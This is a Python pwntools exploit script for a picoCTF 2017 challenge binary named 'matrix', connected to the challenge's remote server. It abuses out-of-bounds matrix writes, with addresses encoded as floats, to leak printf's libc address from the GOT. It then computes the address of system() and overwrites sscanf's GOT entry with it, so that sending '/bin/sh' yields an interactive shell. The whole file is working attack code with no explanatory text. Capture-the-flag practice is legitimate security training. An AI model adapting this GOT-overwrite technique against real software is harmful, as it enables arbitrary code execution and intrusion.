from pwn import *
import sys
import struct

SYSTEM_LIBC = 0x3e3e0
PRINTF_LIBC = 0x4cc70

PRINTF_GOT = 0x804a108
SSCANF_GOT = 0x804a12c

p = remote('shell2017.picoctf.com', 33490)
# p = process(['./matrix'])

p.sendline("create 4 1")
p.sendline("create 1 1")
# p.sendline("get 0 2 0")

# leaking printf libc
addr = struct.pack('<L', PRINTF_GOT)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 0 2 0 "+ str(addr))

p.sendline("get 1 0 0")
p.recvuntil('Matrix[0][0] = ')
data = p.recvline()
# print(data)

addr = struct.pack('<f', float(data))
PRINTF_POS = struct.unpack('<L', addr)[0]
SYSTEM_POS = PRINTF_POS - PRINTF_LIBC + SYSTEM_LIBC

print("printf addr : " + hex(PRINTF_POS))
print("system addr : " + hex(SYSTEM_POS))

# changing sscanf's got to system's
addr = struct.pack('<L', SSCANF_GOT)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 0 2 0 " + str(addr))
p.recvline()

addr = struct.pack('<L', SYSTEM_POS)
addr = struct.unpack('<f', addr)[0]
p.sendline("set 1 0 0 " + str(addr))
p.recvline()

p.sendline("/bin/sh")

#p.recvlines(100)
p.interactive()